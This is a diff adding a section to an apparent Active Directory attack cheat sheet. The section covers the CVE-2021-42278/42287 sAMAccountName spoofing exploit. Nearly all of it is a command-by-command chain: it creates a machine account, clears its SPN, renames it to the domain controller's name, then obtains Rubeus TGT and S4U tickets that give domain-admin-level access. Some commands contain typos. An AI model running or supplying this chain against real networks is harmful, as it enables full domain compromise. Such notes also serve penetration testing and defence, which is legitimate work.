@@ -1155,6 +1155,32 @@ You can also create a new machine account, request a TGT, then remove the SPN an
 https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofing-and-cve-2021-42287-deceiving-the-kdc-active-directory-vulnerabilities/
 
 
+Create a machine account:
+```New-MachineAccount -MachineAccount PC01 -Domain ecorp.lab -DomainController dc.ecorp.lab -Verbose```
+
+
+Clear SPN of the machine account:
+```Set-DomainObject "CN=PC01,CN=Computers,DC=ecorp,DC=lab" -Clear 'serviceprincipalname' -Verbose```
+
+
+_Because you have the "creator owner" access in Active Directory for that object, you can change the sAMAccountName attribute's property. Run the command below to modify that attribute to be the same as that of the domain controller name (without the $)._
+
+Modify the sAMAccountName attribute:
+```Set-MachineAccountAttribute -MachineAccount PC01 -Value "DC" -Attribute sAMAccountName  -Verbose```
+
+Rubeus now requests a TGT token with the faked sAMAccountName as the username and password provided during the computer object creation process. Kerberos validates the request and provides a TGT token that can be used later:
+
+```.\Rubeus.exe asktgt /user:DC /password:12345 /domain:ecorp.lab /dc: dc.ecorp.lab /nowrap```
+
+Now set your machine account back and ask for a TGS:
+
+```Set-MachnineAccountAttribute -MachineAccount PC01 -Value 'PC01$' -Attribute 'samaccountname' -Verbose```
+
+ask for a TGS using S4U and the previously stored ticket:
+
+```.\Rubeus.exe s4u /ticket:... /msdsspn::ldap\dc.ecorp.lab /ptt```
+
+because it cant find the user 'DC' as described in the ticket, it will look again, find DC$ (itself) and issue a valid TGS with the DC$ perms i.e., DA for all as we asked for LDAP krbtgt service.
 
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
